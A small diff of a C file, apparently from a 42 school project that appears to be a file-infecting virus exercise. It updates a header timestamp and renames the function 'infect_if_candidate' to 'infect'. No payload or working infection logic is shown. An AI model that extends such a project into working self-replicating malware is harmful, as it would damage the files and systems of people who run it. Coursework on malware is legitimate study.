@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/22 23:01:15 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/26 22:15:56 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -46,7 +46,7 @@ static bool	is_candidate(const char *file)
 	return true;
 }
 
-inline bool	infect_if_candidate(const char *file, uint64_t seed[2])
+inline bool	infect(const char *file, uint64_t seed[2])
 {
 	struct safe_ptr	original_ref;
 	struct safe_ptr	clone_ref;
